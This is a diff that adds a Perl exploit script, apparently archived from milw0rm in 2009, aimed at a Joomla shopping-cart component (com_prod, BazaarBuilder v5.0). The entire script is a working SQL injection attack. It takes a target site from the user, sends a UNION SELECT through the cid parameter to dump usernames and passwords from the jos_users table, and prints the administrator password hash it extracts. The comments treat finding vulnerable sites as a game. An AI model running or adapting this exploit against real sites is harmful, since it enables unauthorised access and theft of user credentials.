@@ -1,0 +1,33 @@
+#!/usr/bin/perl -w
+#Joomla component: BazaarBuilder Shopping Cart Software v.5.0 sql injection#
+########################################
+#[+] Author : XaDoS
+#[+] Contact me: www.securitycode.it // xados [at] hotmail [dot] it
+#[+] Greetz : Plucky - Str0ke - GsC - boom3rang - My girl ;-)
+#[+] Module_Name: BazaarBuilder Ecommerce Shopping Cart Software v. 5.0
+#[+] Script_Name: Joomla
+#[+] Dork: find it XD
+########################################
+print "\t\t-------------------------------------------------------------\n\n";
+print "\t\t|                  ---||> X:A:D:O:S <||---                    |\n\n";
+print "\t\t-------------------------------------------------------------\n\n";
+print "\t\t|Joomla Module com_prod <= Remote SQL Injection Vuln|\n\n";
+print "\t\t| XaDoS ~ www.securitycode.it |\n\n";
+print "\t\t-------------------------------------------------------------\n\n";
+use LWP::UserAgent;
+print "\nEnter the url of vuln site[http://wwww.example.com]: ";
+chomp(my $target=<STDIN>);
+$column_name="concat(username,char(58),password)";
+$table_name="jos_users";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target . "/index.php?option=com_prod&task=products&cid=-9999%20union%20all%20select%201,2,3,".$column_name.",5,6,7,8,9,10,11,12,13,14,15,16,17,18%20from/**/".$table_name."+/*+";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
+print "\n[+] Admin Hash : $1\n\n";
+print "||> Exploit done! ;-) <||\n\n";
+}
+else{print "\n||> Exploit failed! :-( <||\n";
+}
+
+# milw0rm.com [2009-01-21]
